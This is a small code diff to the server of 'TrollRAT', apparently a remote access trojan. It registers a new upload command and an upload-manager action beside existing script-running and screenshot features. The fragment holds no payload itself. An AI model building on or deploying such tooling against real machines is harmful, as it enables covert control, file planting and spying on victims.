@@ -133,6 +133,7 @@ namespace TrollRAT.Server
 
             commands.Add(new RunScriptCommand());
             commands.Add(new ScreenshotCommand());
+            commands.Add(new UploadCommand());
 
             commands.Add(new GenerateCodeCommand());
             commands.Add(new UseCodeCommand());
@@ -141,6 +142,7 @@ namespace TrollRAT.Server
             actions.Add(new GlobalActionShareCodeManager(this));
             actions.Add(new GlobalActionScreenshot(this));
             actions.Add(new GlobalActionRunScript(this));
+            actions.Add(new GlobalActionUploadManager(this));
         }
 
         private void initInjections()
